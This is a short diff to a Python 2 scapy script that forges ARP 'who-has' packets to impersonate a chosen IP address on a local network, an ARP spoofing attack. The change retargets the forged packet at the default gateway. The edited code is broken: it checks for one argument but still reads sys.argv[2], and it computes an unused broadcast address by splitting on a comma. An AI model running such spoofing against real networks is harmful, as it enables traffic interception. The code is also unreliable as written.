@@ -3,8 +3,8 @@ import socket
 from scapy.all import *
 import sys
 
-if len(sys.argv) != 3:
-    print "Who is target? Who will you impersonate?"
+if len(sys.argv) != 2:
+    print "Who is target?"
     sys.exit(1)
 
 ifName = netifaces.interfaces()
@@ -23,6 +23,7 @@ gateIP = gateInfo['default'][2][0]
 print "[*] Gateway Info : ", gateInfo
 print "[*] Gateway IP : ", gateIP
 
-packet = Ether()/ARP(op="who-has",hwsrc=ifMAC,psrc=sys.argv[2],pdst=sys.argv[1])
+broadIP = ifIP.replace("."+ifIP.split(',')[-1], '')+".255"
+packet = Ether()/ARP(op="who-has",hwsrc=ifMAC,psrc=sys.argv[2],pdst=gateIP)
 sendp(packet)
 	
